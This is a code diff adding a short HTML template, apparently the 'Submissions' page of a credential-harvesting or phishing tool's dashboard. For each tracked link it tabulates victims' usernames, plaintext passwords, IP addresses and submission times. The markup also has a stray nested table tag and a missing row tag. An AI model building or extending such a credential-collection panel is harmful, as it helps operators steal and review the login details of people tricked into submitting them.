@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>Submissions</title></head>
+<body>
+<h2>Submissions for link: {{ link_id }}</h2>
+<table border="1">
+    <table><th>Username</th><th>Password</th><th>IP</th><th>Time</th></tr>
+    {% for sub in subs %}
+    <tr><td>{{ sub.username }}</td><td>{{ sub.password }}</td><td>{{ sub.ip }}</td><td>{{ sub.submitted_at }}</td></tr>
+    {% endfor %}
+</table>
+<a href="/dashboard">Back to Dashboard</a>
+</body>
+</html>
